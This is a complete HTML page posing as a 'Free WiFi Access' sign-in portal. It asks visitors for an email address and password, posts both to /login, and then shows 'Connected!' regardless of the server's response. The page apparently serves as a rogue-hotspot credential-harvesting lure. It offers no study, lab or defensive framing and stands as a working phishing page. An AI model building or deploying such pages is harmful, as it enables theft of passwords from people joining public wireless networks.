<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Free WiFi - Connect</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #e0e0e0;
}
.portal {
    background: rgba(255,255,255,0.05);
    backdrop-filter: blur(20px);
    border: 1px solid rgba(255,255,255,0.1);
    border-radius: 16px;
    padding: 40px;
    width: 400px;
    max-width: 90vw;
    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
}
.logo { text-align: center; margin-bottom: 24px; }
.logo .icon { font-size: 48px; margin-bottom: 8px; }
.logo h1 { font-size: 22px; font-weight: 600; color: #00d4ff; }
.logo p { color: #8899aa; font-size: 13px; margin-top: 4px; }
.form-group { margin-bottom: 16px; }
.form-group label {
    display: block; font-size: 12px; color: #8899aa;
    margin-bottom: 6px; text-transform: uppercase; letter-spacing: 1px;
}
.form-group input {
    width: 100%; padding: 12px 16px;
    background: rgba(0,0,0,0.3);
    border: 1px solid rgba(255,255,255,0.1);
    border-radius: 8px; color: #fff; font-size: 15px;
    transition: border-color 0.3s;
}
.form-group input:focus {
    outline: none; border-color: #00d4ff;
}
.btn {
    width: 100%; padding: 14px;
    background: linear-gradient(135deg, #00d4ff, #0099cc);
    border: none; border-radius: 8px;
    color: #fff; font-size: 16px; font-weight: 600;
    cursor: pointer; margin-top: 8px;
    transition: opacity 0.3s;
}
.btn:hover { opacity: 0.9; }
.terms {
    text-align: center; margin-top: 16px;
    font-size: 11px; color: #667788;
}
.terms a { color: #00d4ff; text-decoration: none; }
.success {
    display: none; text-align: center; padding: 40px 0;
}
.success .check { font-size: 64px; margin-bottom: 16px; }
.success h2 { color: #00ff88; margin-bottom: 8px; }
</style>
</head>
<body>
<div class="portal">
    <div id="loginForm">
        <div class="logo">
            <div class="icon">📶</div>
            <h1>Free WiFi Access</h1>
            <p>Sign in to connect to the internet</p>
        </div>
        <form method="POST" action="/login" onsubmit="return handleSubmit(event)">
            <div class="form-group">
                <label>Email Address</label>
                <input type="email" name="email" id="email" placeholder="you@example.com" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" id="password" placeholder="Enter password" required>
            </div>
            <button type="submit" class="btn">Connect to WiFi</button>
        </form>
        <div class="terms">
            By connecting, you agree to our <a href="#">Terms of Service</a>
        </div>
    </div>
    <div id="successMsg" class="success">
        <div class="check">✅</div>
        <h2>Connected!</h2>
        <p style="color:#8899aa">You now have internet access.<br>Enjoy browsing!</p>
    </div>
</div>
<script>
function handleSubmit(e) {
    e.preventDefault();
    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;
    fetch('/login', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password)
    }).then(function() {
        document.getElementById('loginForm').style.display = 'none';
        document.getElementById('successMsg').style.display = 'block';
    });
    return false;
}
</script>
</body>
</html>
